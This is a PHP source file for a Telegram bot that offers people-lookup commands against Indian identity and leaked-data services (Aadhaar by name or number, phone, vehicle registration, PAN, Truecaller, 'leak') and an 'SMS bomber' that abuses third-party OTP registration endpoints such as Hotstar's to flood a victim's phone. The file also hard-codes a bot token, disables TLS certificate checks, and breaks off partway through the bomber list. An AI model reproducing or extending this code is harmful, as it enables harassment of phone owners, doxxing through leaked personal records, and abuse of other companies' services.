<?php
// ================================================================
// BOT CONFIGURATION
// ================================================================

define('BOT_TOKEN', '8952462497:AAEq8DGkb0fSkG4qRKeR_7JdhF8HOrzPO3Q');
define('OWNER_ID', 8416917212);
define('BOT_USERNAME', '@itachiinfo_bot');
define('CHANNEL_1', 'https://t.me/mikeykun_x');
define('CHANNEL_2', 'https://t.me/godxpain1');
define('OFFICIAL_GROUP', 'https://t.me/All_channel_links_please_join');
define('COOLDOWN_SECONDS', 5);
define('DB_FILE', 'bot_database.json');
define('CURL_TIMEOUT', 30);
define('CACHE_DURATION', 300);
define('MAX_RETRIES', 2);
define('MAX_MESSAGE_LENGTH', 4096);


class UserHistory {
    private $history_file;
    private $data = [];
    private $loaded = false;
    private $lock_file;
    
    public function __construct() {
        $this->history_file = dirname(__FILE__) . '/' . 'user_history.json';
        $this->lock_file = $this->history_file . '.lock';
        $this->load();
    }
    
    private function acquireLock() {
        $fp = fopen($this->lock_file, 'w');
        if ($fp === false) return false;
        if (flock($fp, LOCK_EX)) {
            return $fp;
        }
        fclose($fp);
        return false;
    }
    
    private function releaseLock($fp) {
        if ($fp) {
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }
    
    private function load() {
        if ($this->loaded) return;
        if (file_exists($this->history_file)) {
            $content = file_get_contents($this->history_file);
            $this->data = json_decode($content, true) ?: [];
        } else {
            $this->data = [];
            $this->save();
        }
        $this->loaded = true;
    }
    
    private function save() {
        $fp = $this->acquireLock();
        if ($fp) {
            file_put_contents($this->history_file, json_encode($this->data, JSON_PRETTY_PRINT));
            $this->releaseLock($fp);
        }
    }
    
    public function addHistory($user_id, $command, $input, $result) {
        // History saving disabled
        return;
    }
    
    public function getUserInfo($user_id) {
        global $db;
        if (isset($db)) {
            $user = $db->getUser($user_id);
            if ($user) {
                return [
                    'username' => $user['username'] ?? '',
                    'first_name' => $user['first_name'] ?? '',
                    'last_name' => $user['last_name'] ?? ''
                ];
            }
        }
        return ['username' => '', 'first_name' => '', 'last_name' => ''];
    }
    
    public function getUserHistory($user_id, $limit = 20) {
        return [];
    }
    
    public function getAllHistory() {
        return [];
    }
    
    public function clearUserHistory($user_id) {
        return false;
    }
    
    public function searchHistory($query, $user_id = null) {
        return [];
    }
}

// ================================================================
// CACHE CLASS
// ================================================================

class Cache {
    private $cache_file;
    private $data = [];
    private $lock_file;
    
    public function __construct() {
        $this->cache_file = dirname(__FILE__) . '/bot_cache.json';
        $this->lock_file = $this->cache_file . '.lock';
        $this->load();
    }
    
    private function acquireLock() {
        $fp = fopen($this->lock_file, 'w');
        if ($fp === false) return false;
        if (flock($fp, LOCK_EX)) {
            return $fp;
        }
        fclose($fp);
        return false;
    }
    
    private function releaseLock($fp) {
        if ($fp) {
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }
    
    private function load() {
        if (file_exists($this->cache_file)) {
            $content = file_get_contents($this->cache_file);
            $this->data = json_decode($content, true) ?: [];
            $this->cleanExpired();
        }
    }
    
    private function save() {
        $fp = $this->acquireLock();
        if ($fp) {
            file_put_contents($this->cache_file, json_encode($this->data, JSON_PRETTY_PRINT));
            $this->releaseLock($fp);
        }
    }
    
    public function get($key) {
        if (isset($this->data[$key])) {
            if ($this->data[$key]['expires'] > time()) {
                return $this->data[$key]['value'];
            } else {
                unset($this->data[$key]);
                $this->save();
            }
        }
        return null;
    }
    
    public function set($key, $value, $ttl = CACHE_DURATION) {
        $this->data[$key] = [
            'value' => $value,
            'expires' => time() + $ttl
        ];
        $this->save();
    }
    
    public function cleanExpired() {
        $changed = false;
        foreach ($this->data as $key => $item) {
            if ($item['expires'] < time()) {
                unset($this->data[$key]);
                $changed = true;
            }
        }
        if ($changed) {
            $this->save();
        }
    }
    
    public function clear() {
        $this->data = [];
        $this->save();
    }
}

// ================================================================
// DATABASE CLASS
// ================================================================

class Database {
    private $db_file;
    private $data = [];
    private $loaded = false;
    private $lock_file;
    
    public function __construct($file = DB_FILE) {
        $this->db_file = dirname(__FILE__) . '/' . $file;
        $this->lock_file = $this->db_file . '.lock';
        $this->load();
    }
    
    private function acquireLock() {
        $fp = fopen($this->lock_file, 'w');
        if ($fp === false) return false;
        if (flock($fp, LOCK_EX)) {
            return $fp;
        }
        fclose($fp);
        return false;
    }
    
    private function releaseLock($fp) {
        if ($fp) {
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }
    
    private function load() {
        if ($this->loaded) return;
        
        if (file_exists($this->db_file)) {
            $content = file_get_contents($this->db_file);
            $this->data = json_decode($content, true) ?: $this->getDefaultStructure();
        } else {
            $this->data = $this->getDefaultStructure();
            $this->save();
        }
        $this->loaded = true;
    }
    
    private function getDefaultStructure() {
        return [
            'users' => [],
            'settings' => [
                'force_join_enabled' => true,
                'spam_protection' => true,
                'cooldown_seconds' => 5,
                'owner_id' => OWNER_ID,
                'bot_username' => BOT_USERNAME,
                'channel_1' => CHANNEL_1,
                'channel_2' => CHANNEL_2,
                'official_group' => OFFICIAL_GROUP
            ],
            'blacklist' => [],
            'groups' => [],
            'admins' => [OWNER_ID],
            'locked_groups' => [],
            'custom_commands' => [],
            'bombers' => [],
            'broadcast_history' => [],
            'pending_group_requests' => []
        ];
    }
    
    public function save() {
        $fp = $this->acquireLock();
        if ($fp) {
            file_put_contents($this->db_file, json_encode($this->data, JSON_PRETTY_PRINT));
            $this->releaseLock($fp);
        }
    }
    
    public function get($key) {
        $this->load();
        return $this->data[$key] ?? null;
    }
    
    public function set($key, $value) {
        $this->load();
        $this->data[$key] = $value;
        $this->save();
    }
    
    public function getUser($user_id) {
        $this->load();
        foreach ($this->data['users'] as &$user) {
            if ($user['user_id'] == $user_id) {
                return $user;
            }
        }
        return null;
    }
    
    public function addUser($user_data) {
        $this->load();
        $user_id = $user_data['user_id'];
        $existing = $this->getUser($user_id);
        
        if ($existing) {
            foreach ($user_data as $key => $value) {
                if ($key !== 'user_id') {
                    $existing[$key] = $value;
                }
            }
            $existing['last_active'] = date('Y-m-d H:i:s');
            $this->save();
            return true;
        }
        
        $user_data['joined_date'] = date('Y-m-d H:i:s');
        $user_data['last_active'] = date('Y-m-d H:i:s');
        $user_data['total_commands'] = 0;
        $user_data['is_banned'] = false;
        $user_data['has_joined_channel'] = false;
        $user_data['is_admin'] = in_array($user_id, $this->data['admins']);
        
        $this->data['users'][] = $user_data;
        $this->save();
        return true;
    }
    
    public function updateUser($user_id, $data) {
        $this->load();
        foreach ($this->data['users'] as &$user) {
            if ($user['user_id'] == $user_id) {
                foreach ($data as $key => $value) {
                    $user[$key] = $value;
                }
                $this->save();
                return true;
            }
        }
        return false;
    }
    
    public function getSetting($key) {
        $this->load();
        return $this->data['settings'][$key] ?? null;
    }
    
    public function setSetting($key, $value) {
        $this->load();
        $this->data['settings'][$key] = $value;
        $this->save();
    }
    
    public function isUserBanned($user_id) {
        $this->load();
        foreach ($this->data['blacklist'] as $entry) {
            if ($entry['user_id'] == $user_id) {
                return true;
            }
        }
        return false;
    }
    
    public function banUser($user_id, $reason = 'No reason provided') {
        $this->load();
        if (!$this->isUserBanned($user_id)) {
            $this->data['blacklist'][] = [
                'user_id' => $user_id,
                'reason' => $reason,
                'banned_at' => date('Y-m-d H:i:s')
            ];
            $this->save();
            return true;
        }
        return false;
    }
    
    public function unbanUser($user_id) {
        $this->load();
        foreach ($this->data['blacklist'] as $index => $entry) {
            if ($entry['user_id'] == $user_id) {
                unset($this->data['blacklist'][$index]);
                $this->data['blacklist'] = array_values($this->data['blacklist']);
                $this->save();
                return true;
            }
        }
        return false;
    }
    
    public function isGroupAllowed($group_id) {
        $this->load();
        foreach ($this->data['groups'] as $group) {
            if ($group['group_id'] == $group_id) {
                return $group['is_allowed'] ?? false;
            }
        }
        return false;
    }
    
    public function isGroupLocked($group_id) {
        $this->load();
        return in_array($group_id, $this->data['locked_groups']);
    }
    
    public function lockGroup($group_id) {
        $this->load();
        if (!in_array($group_id, $this->data['locked_groups'])) {
            $this->data['locked_groups'][] = $group_id;
            $this->save();
            return true;
        }
        return false;
    }
    
    public function unlockGroup($group_id) {
        $this->load();
        $index = array_search($group_id, $this->data['locked_groups']);
        if ($index !== false) {
            unset($this->data['locked_groups'][$index]);
            $this->data['locked_groups'] = array_values($this->data['locked_groups']);
            $this->save();
            return true;
        }
        return false;
    }
    
    public function addGroup($group_data) {
        $this->load();
        foreach ($this->data['groups'] as &$group) {
            if ($group['group_id'] == $group_data['group_id']) {
                $group['is_allowed'] = $group_data['is_allowed'];
                $group['group_name'] = $group_data['group_name'] ?? 'Unknown';
                $this->save();
                return true;
            }
        }
        $this->data['groups'][] = $group_data;
        $this->save();
        return true;
    }
    
    public function removeGroup($group_id) {
        $this->load();
        foreach ($this->data['groups'] as $index => $group) {
            if ($group['group_id'] == $group_id) {
                unset($this->data['groups'][$index]);
                $this->data['groups'] = array_values($this->data['groups']);
                $this->save();
                return true;
            }
        }
        return false;
    }
    
    public function getAllGroups() {
        $this->load();
        return $this->data['groups'];
    }
    
    public function addAdmin($user_id) {
        $this->load();
        if (!in_array($user_id, $this->data['admins'])) {
            $this->data['admins'][] = $user_id;
            $this->updateUser($user_id, ['is_admin' => true]);
            $this->save();
            return true;
        }
        return false;
    }
    
    public function removeAdmin($user_id) {
        $this->load();
        $index = array_search($user_id, $this->data['admins']);
        if ($index !== false && $user_id != OWNER_ID) {
            unset($this->data['admins'][$index]);
            $this->data['admins'] = array_values($this->data['admins']);
            $this->updateUser($user_id, ['is_admin' => false]);
            $this->save();
            return true;
        }
        return false;
    }
    
    public function addCustomCommand($command_data) {
        $this->load();
        $this->data['custom_commands'][] = $command_data;
        $this->save();
        return true;
    }
    
    public function getCustomCommand($command_name) {
        $this->load();
        foreach ($this->data['custom_commands'] as $cmd) {
            if ($cmd['command_name'] === $command_name) {
                return $cmd;
            }
        }
        return null;
    }
    
    public function getAllCustomCommands() {
        $this->load();
        return $this->data['custom_commands'];
    }
    
    public function removeCustomCommand($command_name) {
        $this->load();
        foreach ($this->data['custom_commands'] as $index => $cmd) {
            if ($cmd['command_name'] === $command_name) {
                unset($this->data['custom_commands'][$index]);
                $this->data['custom_commands'] = array_values($this->data['custom_commands']);
                $this->save();
                return true;
            }
        }
        return false;
    }
    
    public function getAllUsers() {
        $this->load();
        return $this->data['users'];
    }
    
    public function getTotalUsers() {
        $this->load();
        return count($this->data['users']);
    }
    
    public function addBroadcast($broadcast_data) {
        $this->load();
        $this->data['broadcast_history'][] = $broadcast_data;
        $this->save();
        return true;
    }
    
    public function getBroadcastHistory($limit = 20) {
        $this->load();
        return array_slice($this->data['broadcast_history'], -$limit);
    }
    
    public function isPendingGroupRequest($group_id) {
        $this->load();
        return in_array($group_id, $this->data['pending_group_requests']);
    }
    
    public function addPendingGroupRequest($group_id) {
        $this->load();
        if (!in_array($group_id, $this->data['pending_group_requests'])) {
            $this->data['pending_group_requests'][] = $group_id;
            $this->save();
            return true;
        }
        return false;
    }
    
    public function removePendingGroupRequest($group_id) {
        $this->load();
        $index = array_search($group_id, $this->data['pending_group_requests']);
        if ($index !== false) {
            unset($this->data['pending_group_requests'][$index]);
            $this->data['pending_group_requests'] = array_values($this->data['pending_group_requests']);
            $this->save();
            return true;
        }
        return false;
    }
}

// ================================================================
// TELEGRAM API WRAPPER
// ================================================================

class TelegramAPI {
    private $token;
    private $api_url;
    
    public function __construct($token) {
        $this->token = $token;
        $this->api_url = "https://api.telegram.org/bot{$token}";
    }
    
    public function call($method, $params = [], $timeout = 30) {
        $url = $this->api_url . '/' . $method;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($http_code === 200 && $response) {
            $result = json_decode($response, true);
            if ($result && $result['ok']) {
                return $result['result'];
            }
        }
        return null;
    }
    
    public function sendMessage($chat_id, $text, $parse_mode = 'HTML', $reply_markup = null, $disable_notification = false) {
        $params = [
            'chat_id' => $chat_id,
            'text' => $text,
            'parse_mode' => $parse_mode,
            'disable_web_page_preview' => true,
            'disable_notification' => $disable_notification
        ];
        if ($reply_markup) {
            $params['reply_markup'] = $reply_markup;
        }
        return $this->call('sendMessage', $params);
    }
    
    public function editMessageText($chat_id, $message_id, $text, $parse_mode = 'HTML', $reply_markup = null) {
        $params = [
            'chat_id' => $chat_id,
            'message_id' => $message_id,
            'text' => $text,
            'parse_mode' => $parse_mode,
            'disable_web_page_preview' => true
        ];
        if ($reply_markup) {
            $params['reply_markup'] = $reply_markup;
        }
        return $this->call('editMessageText', $params);
    }
    
    public function getChatMember($chat_id, $user_id) {
        return $this->call('getChatMember', [
            'chat_id' => $chat_id,
            'user_id' => $user_id
        ]);
    }
    
    public function getMe() {
        return $this->call('getMe');
    }
    
    public function answerCallbackQuery($callback_id, $text = '', $show_alert = false) {
        return $this->call('answerCallbackQuery', [
            'callback_query_id' => $callback_id,
            'text' => $text,
            'show_alert' => $show_alert
        ]);
    }
    
    public function sendChatAction($chat_id, $action) {
        return $this->call('sendChatAction', [
            'chat_id' => $chat_id,
            'action' => $action
        ]);
    }
    
    public function getChat($chat_id) {
        return $this->call('getChat', [
            'chat_id' => $chat_id
        ]);
    }
    
    public function deleteMessage($chat_id, $message_id) {
        return $this->call('deleteMessage', [
            'chat_id' => $chat_id,
            'message_id' => $message_id
        ]);
    }
}

// ================================================================
// RATE LIMITER
// ================================================================

class RateLimiter {
    private $db;
    private $cooldown_seconds;
    private $command_timestamps = [];
    
    public function __construct($db) {
        $this->db = $db;
        $this->cooldown_seconds = $db->getSetting('cooldown_seconds') ?: 5;
    }
    
    public function isRateLimited($user_id) {
        if (!$this->db->getSetting('spam_protection')) {
            return false;
        }
        
        $user = $this->db->getUser($user_id);
        if (!$user) {
            return false;
        }
        
        if ($user['is_admin'] ?? false) {
            return false;
        }
        
        $current_time = time();
        
        if (!isset($this->command_timestamps[$user_id])) {
            $this->command_timestamps[$user_id] = [];
        }
        
        $this->command_timestamps[$user_id] = array_filter(
            $this->command_timestamps[$user_id],
            function($time) use ($current_time) {
                return ($current_time - $time) < 60;
            }
        );
        
        if (!empty($this->command_timestamps[$user_id])) {
            $last_command = max($this->command_timestamps[$user_id]);
            $time_diff = $current_time - $last_command;
            if ($time_diff < $this->cooldown_seconds) {
                return true;
            }
        }
        
        $this->command_timestamps[$user_id][] = $current_time;
        return false;
    }
    
    public function getRemainingTime($user_id) {
        if (!isset($this->command_timestamps[$user_id])) {
            return 0;
        }
        
        $current = time();
        $last_command = max($this->command_timestamps[$user_id]);
        $diff = $current - $last_command;
        $remaining = $this->cooldown_seconds - $diff;
        return $remaining > 0 ? $remaining : 0;
    }
}

// ================================================================
// API CALLER
// ================================================================

class APICaller {
    private $cache;
    
    public function __construct() {
        $this->cache = new Cache();
    }
    
    public function call($url, $force_refresh = false, $timeout = CURL_TIMEOUT) {
        $cache_key = md5($url);
        
        if (!$force_refresh) {
            $cached = $this->cache->get($cache_key);
            if ($cached !== null) {
                return $cached;
            }
        }
        
        $result = $this->makeRequest($url, $timeout);
        
        if ($result) {
            $this->cache->set($cache_key, $result);
        }
        
        return $result;
    }
    
    private function makeRequest($url, $timeout = CURL_TIMEOUT) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        
        $retry = 0;
        $max_retries = MAX_RETRIES;
        
        while ($retry <= $max_retries) {
            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            if ($http_code >= 200 && $http_code < 300 && $response) {
                $decoded = json_decode($response, true);
                if ($decoded !== null) {
                    curl_close($ch);
                    return $decoded;
                } elseif (strlen($response) > 0) {
                    curl_close($ch);
                    return ['data' => $response, 'raw' => true];
                }
            }
            
            $retry++;
            if ($retry <= $max_retries) {
                usleep(300000 * $retry);
            }
        }
        
        curl_close($ch);
        return null;
    }
}

// ================================================================
// FORMATTER CLASS
// ================================================================

class Formatter {
    private function formatLink($url) {
        if (empty($url) || !is_string($url)) return '';
        return '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">🔗 Tap to Open</a>';
    }
    
    public function formatPanInfo($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API\n\n<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        }
        return "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
    }
    
    public function formatTeraboxInfo($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API\n\n<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        }
        return "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
    }
    
    public function formatSnapchatInfo($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API\n\n<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        }
        return "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
    }
    
    public function formatInstagramProfileInfo($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API\n\n<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        }
        return "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
    }
    
    public function formatTGInfo($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API\n\n<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        }
        return "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
    }
    
    public function formatLeakInfo($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API\n\n<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        }
        return "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
    }
    
    public function formatSongSearch($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API";
        }
        
        $output = "🎵 <b>Song Search Results</b>\n\n";
        
        if (isset($data['results']) && is_array($data['results'])) {
            foreach (array_slice($data['results'], 0, 10) as $index => $song) {
                $num = $index + 1;
                $output .= "{$num}. <b>" . htmlspecialchars($song['title'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "</b>\n";
                $output .= "   🎤 <b>Artist:</b> " . htmlspecialchars($song['artists'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                $output .= "   💿 <b>Album:</b> " . htmlspecialchars($song['album'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                $output .= "   ⏱️ <b>Duration:</b> " . htmlspecialchars($song['duration'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                if (isset($song['download_url'])) {
                    $output .= "   📥 <b>Download:</b> " . $this->formatLink($song['download_url']) . "\n";
                }
                $output .= "\n";
            }
        }
        return $output;
    }
    
    public function formatWeather($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API";
        }
        
        $output = "🌤️ <b>Weather Info</b>\n\n";
        
        if (isset($data['city'])) {
            $output .= "📍 <b>City:</b> " . htmlspecialchars($data['city'], ENT_QUOTES, 'UTF-8') . "\n";
        }
        if (isset($data['data']['current_condition'][0]) && is_array($data['data']['current_condition'][0])) {
            $current = $data['data']['current_condition'][0];
            $output .= "🌡️ <b>Temperature:</b> " . htmlspecialchars($current['temp_C'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "°C\n";
            $output .= "🌡️ <b>Feels Like:</b> " . htmlspecialchars($current['FeelsLikeC'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "°C\n";
            $output .= "💧 <b>Humidity:</b> " . htmlspecialchars($current['humidity'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "%\n";
            $output .= "💨 <b>Wind:</b> " . htmlspecialchars($current['windspeedKmph'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . " km/h\n";
            $output .= "☁️ <b>Cloud Cover:</b> " . htmlspecialchars($current['cloudcover'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "%\n";
            if (isset($current['weatherDesc'][0]['value'])) {
                $output .= "📝 <b>Condition:</b> " . htmlspecialchars($current['weatherDesc'][0]['value'], ENT_QUOTES, 'UTF-8') . "\n";
            }
            if (isset($current['weatherIconUrl'][0]['value'])) {
                $output .= "\n🖼️ <b>Icon:</b>\n" . $this->formatLink($current['weatherIconUrl'][0]['value']) . "\n";
            }
        }
        return $output;
    }
    
    public function formatCountrySearch($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API";
        }
        
        $output = "🌍 <b>Country Search</b>\n\n";
        
        if (isset($data['data']['data']['objects']) && is_array($data['data']['data']['objects'])) {
            foreach ($data['data']['data']['objects'] as $country) {
                if (isset($country['names']['common'])) {
                    $output .= "🏳️ <b>Country:</b> " . htmlspecialchars($country['names']['common'], ENT_QUOTES, 'UTF-8') . "\n";
                    $output .= "🏛️ <b>Official:</b> " . htmlspecialchars($country['names']['official'], ENT_QUOTES, 'UTF-8') . "\n";
                    $output .= "🌍 <b>Region:</b> " . htmlspecialchars($country['region'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                    $output .= "👥 <b>Population:</b> " . number_format($country['population'] ?? 0) . "\n";
                    $output .= "🏙️ <b>Capital:</b> " . htmlspecialchars($country['capitals'][0]['name'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                    if (isset($country['flag']['emoji'])) {
                        $output .= "🏁 <b>Flag:</b> " . htmlspecialchars($country['flag']['emoji'], ENT_QUOTES, 'UTF-8') . "\n";
                    }
                    if (isset($country['currencies']) && is_array($country['currencies'])) {
                        $currs = [];
                        foreach ($country['currencies'] as $curr) {
                            $currs[] = $curr['name'] ?? '';
                        }
                        $output .= "💰 <b>Currency:</b> " . htmlspecialchars(implode(', ', $currs), ENT_QUOTES, 'UTF-8') . "\n";
                    }
                    if (isset($country['links']['wikipedia'])) {
                        $output .= "🔗 <b>Wikipedia:</b> " . $this->formatLink($country['links']['wikipedia']) . "\n";
                    }
                    $output .= "\n---\n\n";
                }
            }
        }
        return $output;
    }
    
    public function formatPlaystoreSearch($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API";
        }
        
        $output = "📱 <b>PlayStore Search</b>\n\n";
        
        if (isset($data['data']['apps']) && is_array($data['data']['apps'])) {
            foreach (array_slice($data['data']['apps'], 0, 10) as $app) {
                $output .= "📱 <b>" . htmlspecialchars($app['name'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "</b>\n";
                $output .= "├─ 👨‍💻 <b>Developer:</b> " . htmlspecialchars($app['developer'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                $output .= "├─ 📦 <b>Package:</b> <code>" . htmlspecialchars($app['package'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "</code>\n";
                $output .= "├─ 📊 <b>Downloads:</b> " . number_format($app['downloads'] ?? 0) . "\n";
                $output .= "├─ ⭐ <b>Rating:</b> " . htmlspecialchars($app['rating'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                $output .= "├─ 📅 <b>Updated:</b> " . htmlspecialchars($app['updated_date'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "\n";
                if (isset($app['download_url'])) {
                    $output .= "├─ 📥 <b>Download:</b> " . $this->formatLink($app['download_url']) . "\n";
                }
                if (isset($app['icon'])) {
                    $output .= "├─ 🖼️ <b>Icon:</b> " . $this->formatLink($app['icon']) . "\n";
                }
                $output .= "\n";
            }
        }
        return $output;
    }
    
    public function formatBgmiInfo($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API";
        }
        
        $output = "🎮 <b>BGMI Player Info</b>\n\n";
        
        if (isset($data['username'])) {
            $output .= "👤 <b>Username:</b> " . htmlspecialchars($data['username'], ENT_QUOTES, 'UTF-8') . "\n";
        }
        if (isset($data['uid'])) {
            $output .= "🆔 <b>UID:</b> <code>" . htmlspecialchars($data['uid'], ENT_QUOTES, 'UTF-8') . "</code>\n";
        }
        if (isset($data['region'])) {
            $output .= "🌍 <b>Region:</b> " . htmlspecialchars($data['region'], ENT_QUOTES, 'UTF-8') . "\n";
        }
        if (isset($data['server'])) {
            $output .= "🖥️ <b>Server:</b> " . htmlspecialchars($data['server'], ENT_QUOTES, 'UTF-8') . "\n";
        }
        return $output;
    }
    
    public function formatGFResponse($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API";
        }
        
        $output = "💕 <b>Girlfriend AI</b>\n\n";
        if (isset($data['response'])) {
            $output .= "❤️ " . htmlspecialchars($data['response'], ENT_QUOTES, 'UTF-8') . "\n";
        }
        return $output;
    }
    
    public function formatWebScraper($data) {
        if (!is_array($data)) {
            return "❌ Invalid data received from API";
        }
        
        $output = "📊 <b>Web Scraper Results</b>\n\n";
        $output .= "📌 <b>Input:</b> <code>" . htmlspecialchars($data['url'] ?? 'N/A', ENT_QUOTES, 'UTF-8') . "</code>\n\n";
        $output .= "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        return $output;
    }
    
    public function formatBomber($data) {
        $output = "💣 <b>Bomber Started!</b>\n\n";
        $output .= "✅ <b>Status:</b> Bombing in progress...\n";
        $output .= "🛑 Use /stop_bomber to stop";
        return $output;
    }
    
    public function formatJsonResult($data, $command, $input) {
        $output = "📊 <b>" . strtoupper($command) . " Results</b>\n\n";
        $output .= "📌 <b>Input:</b> <code>" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</code>\n\n";
        $output .= "<pre>" . json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "</pre>";
        return $output;
    }
}

// ================================================================
// MAIN BOT CLASS
// ================================================================

class SocialMediaBot {
    private $telegram;
    private $db;
    private $history;
    private $formatter;
    private $rateLimiter;
    private $apiCaller;
    private $update;
    private $message;
    private $callback_query;
    private $chat_id;
    private $user_id;
    private $text;
    private $is_group = false;
    private $is_bomber_running = false;
    private $bomber_stop_flag = false;
    private $active_bomber_processes = [];
    
    // Your API
    private $api_endpoints = [
        'pan' => 'Your_Api',
        'terabox' => 'Your_Api',
        'snapchat' => 'Your_Api',
        'insta' => 'Your_Api',
        'tg' => 'Your_Api',
        'leak' => 'Your_Api',
        'web_scraper' => 'Your_Api',
        'song' => 'Your_Api',
        'weather' => 'Your_Api',
        'country_search' => 'Your_Api',
        'playstore_search' => 'Your_Api',
        'bgmi_info' => 'Your_Api',
        'gf' => 'Your_Api',
        'bomber' => 'Your_Api',
        'ip' => 'Your_Api',
        'ipv2' => 'Your_Api',
        'ipv3' => 'Your_Api',
        'ifsc' => 'Your_Api',
        'ifscv2' => 'Your_Api',
        'num' => 'Your_Api',
        'numv2' => 'Your_Api',
        'pak_num' => 'Your_Api',
        'rc' => 'Your_Api',
        'rcv2' => 'Your_Api',
        'rcv3' => 'Your_Api',
        'rcv4' => 'Your_Api',
        'vehicle_full_info' => 'Your_Api',
        'vehicle_to_number' => 'Your_Api',
        'pincode' => 'Your_Api',
        'pincodev2' => 'Your_Api',
        'gst' => 'Your_Api',
        'gstv2' => 'Your_Api',
        'imei' => 'Your_Api',
        'github' => 'Your_Api',
        'Aadhar' => 'Your_Api',
        'Aadhar_by_name' => 'Your_Api',
        'Aadhar_by_number' => 'Your_Api',
        'truecaller' => 'Your_Api',
        'email' => 'Your_Api'
    ];
    
    // JSON commands (for formatting)
    private $json_commands = [
        'pan', 'terabox', 'snapchat', 'insta', 'tg', 'leak',
        'ip', 'ipv2', 'ipv3', 'ifsc', 'ifscv2', 'num', 'numv2', 'pak_num',
        'rc', 'rcv2', 'rcv3', 'rcv4', 'vehicle_full_info', 'vehicle_to_number',
        'pincode', 'pincodev2', 'gst', 'gstv2', 'imei', 'github',
        'Aadhar', 'Aadhar_by_name', 'Aadhar_by_number',
        'truecaller', 'email',
        'web_scraper'
    ];
    
    // ================================================================
    // ULTIMATE BOMBER API CONFIGURATIONS (FULLY WORKING)
    // ================================================================
    
    private $bomber_apis = [];
    
    private function initBomberApis() {
        // SMS BOMBER APIS
        $this->bomber_apis = array_merge($this->bomber_apis, [
            [
                "name" => "Hotstar",
                "method" => "PUT",
                "url" => "https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register?register-by=phone_otp",
                "headers" => [
                    "Host: api.hotstar.com",
